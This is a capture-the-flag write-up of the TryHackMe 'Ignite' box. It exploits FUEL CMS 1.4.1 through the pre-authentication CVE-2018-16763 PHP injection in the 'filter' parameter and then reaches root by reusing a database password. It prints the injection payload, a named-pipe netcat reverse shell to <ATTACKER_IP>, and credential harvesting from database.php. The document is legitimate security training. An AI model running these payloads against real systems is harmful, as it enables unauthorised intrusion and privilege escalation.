Ignite is an Easy Linux box from TryHackMe running FUEL CMS 1.4.1 — a version with a public, pre-authentication remote-code-execution flaw. `robots.txt` points straight at the `/fuel/` admin panel, which still uses the vendor's default `admin:admin`, but the way in doesn't even need it: **CVE-2018-16763** evaluates attacker-supplied PHP through the `filter` parameter, so a single request lands a shell as `www-data`. From there the box is a password-reuse gift — the database password sitting in `database.php` belongs to `root` and is reused for the system account.

## Reconnaissance & Enumeration

### Port Scan

A single full-port service scan shows the box has one way in:

```bash
sudo nmap -p- -sS -sCV -Pn -n 10.128.186.42 -oN nmap
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

Only HTTP is open, and nmap has already done two useful things: identified the application as **FUEL CMS**, and read a `robots.txt` that disallows `/fuel/` — the exact directory a crawler is asked to ignore is often the one worth looking at first.

![The FUEL CMS welcome page served by Apache on port 80](/assets/img/THM/Ignite/cap1.png)

```bash
curl http://10.128.186.42/robots.txt
```

```bash
User-agent: *

```

### Web Enumeration — FUEL CMS

`/fuel/` is the CMS's administration login:

![The FUEL CMS administration login panel at /fuel/](/assets/img/THM/Ignite/cap2.png)

FUEL CMS ships with a well-documented default administrator account, `admin:admin`, which still works here — a finding worth having, though as it turns out the intended exploit is pre-authentication and doesn't need it:

![FUEL CMS documentation showing the default admin credentials, admin / admin](/assets/img/THM/Ignite/cap3.png)

The panel also reveals the version — **FUEL CMS 1.4.1** — which is vulnerable to **CVE-2018-16763**: the framework passes the `pages/select/` `filter` parameter into a PHP evaluation without sanitising it, allowing arbitrary PHP (and therefore OS commands) to run *before* any login.

## Initial Access — CVE-2018-16763 (FUEL CMS RCE) as `www-data`

Exploit-DB entry 47138 is a ready-made PoC for the flaw. `searchsploit` finds it and copies it locally:

```bash
searchsploit fuel cms 1.4.1
searchsploit -m linux/webapps/47138.py
```

The script needs two small edits before it will run: point its `url` variable at the target, and — since it's written for Python 2 — either run it under `python2` or update its `raw_input`/`print` syntax. Its payload is the CVE in miniature: a URL-encoded `filter` value that decodes to `'+pi(print($a='system'))+$a('<cmd>')+'`, wiring up PHP's `system()` and calling it with whatever command is typed at the `cmd:` prompt.

Running it and asking for a named-pipe reverse shell (the target's `/bin/sh` doesn't need bash for this) connects straight back:

```bash
python2 exploit.py
```

```bash
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

```bash
nc -nvlp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.128.186.42 46240
$ whoami
www-data
```

After the usual TTY upgrade, the user flag is in `www-data`'s home directory:

```bash
www-data@ubuntu:/home/www-data$ cat flag.txt
REDACTED
```

## Privilege Escalation — `www-data` → `root`

A quick look at listening services shows MySQL bound to localhost — a database the web app clearly talks to, so its credentials are worth finding:

```bash
www-data@ubuntu:/$ netstat -lntp
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
```

CodeIgniter (the framework FUEL CMS is built on) keeps its database settings in `database.php`:

```bash
www-data@ubuntu:/$ find / -name "database.php" 2>/dev/null
/var/www/html/fuel/application/config/database.php
www-data@ubuntu:/$ cat /var/www/html/fuel/application/config/database.php
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```

Before enumerating the database itself, the cheaper check is whether that password is reused — and because the database user here is `root`, the reuse worth testing is against the *system* `root`:

```bash
www-data@ubuntu:/var/www/html$ su root
Password:
root@ubuntu:/var/www/html# cat /root/root.txt
REDACTED
```

The database password `mememe` is reused for the root account, and the box is done.

## Key Takeaways

- **`robots.txt` is a map, not a lock.** Its only job is to ask well-behaved crawlers to skip a path — which broadcasts that path to anyone reading the file. `/fuel/` was the first and best lead, handed over for free.
- **Default credentials survive far longer than they should.** `admin:admin` still worked on a live install; even though the real exploit was pre-auth, an unchanged vendor default is a full compromise on its own and the first thing to try on any recognised product.
- **A known version number is a shortcut to a known exploit.** Fingerprinting FUEL CMS 1.4.1 turned the whole box into a lookup: the version maps directly to CVE-2018-16763 and a public PoC. Hiding version banners won't save a vulnerable app, but advertising them removes the attacker's only real work.
- **Framework config files are credential stores.** `database.php` held a cleartext password, and the tell was the *username*: a database that authenticates as `root` invites the guess that the same password unlocks the system `root`. Service accounts and human accounts sharing a password is how a web-user shell becomes a root shell in one command.
- **Check reuse before you dig.** Enumerating a database can be slow; `su root` with the password already in hand is instant. When a found credential belongs to a privileged name, testing it against the OS first is almost always the faster path.
